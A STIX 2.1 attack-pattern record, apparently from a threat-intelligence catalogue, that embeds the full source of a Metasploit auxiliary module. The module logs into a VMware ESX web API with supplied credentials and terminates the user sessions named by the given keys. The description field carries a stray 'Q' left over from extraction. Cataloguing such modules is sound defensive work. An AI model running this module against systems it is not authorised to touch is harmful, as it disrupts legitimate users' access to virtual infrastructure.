{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f224aea2-b506-47e5-96ae-b01a57df36a3",
    "created": "2024-08-14T16:22:41.590272Z",
    "modified": "2024-08-14T16:22:41.590276Z",
    "name": "VMWare Terminate ESX Login Sessions",
    "description": "Q This module will log into the Web API of VMWare and try to terminate user login sessions as specified by the session keys.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/vmware/terminate_esx_sessions.rb",
            "external_id": "terminate_esx_sessions.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::VIMSoap\n\n  def initialize\n    super(\n      'Name'           => 'VMWare Terminate ESX Login Sessions',\n      'Description'    => %Q{\n        This module will log into the Web API of VMWare and try to terminate\n        user login sessions as specified by the session keys.},\n      'Author'         => ['theLightCosine'],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => { 'SSL' => true }\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('USERNAME', [ true, \"The username to Authenticate with.\", 'root' ]),\n        OptString.new('PASSWORD', [ true, \"The password to Authenticate with.\", 'password' ]),\n        OptString.new('KEYS', [true, \"The session key to terminate\"])\n      ])\n  end\n\n  def run\n\n    if vim_do_login(datastore['USERNAME'], datastore['PASSWORD']) == :success\n      Shellwords.split(datastore['KEYS']).each do |key|\n        result = vim_terminate_session(key)\n        case result\n        when :notfound\n          print_error \"The specified Session was not found. Check your key: #{key}\"\n        when :success\n          print_good \"The supplied session was terminated successfully: #{key}\"\n        when :error\n          print_error \"There was an error encountered terminating: #{key}\"\n        end\n      end\n    else\n      print_error \"Login Failure on #{datastore['RHOST']}\"\n      return\n    end\n  end\nend\n"
}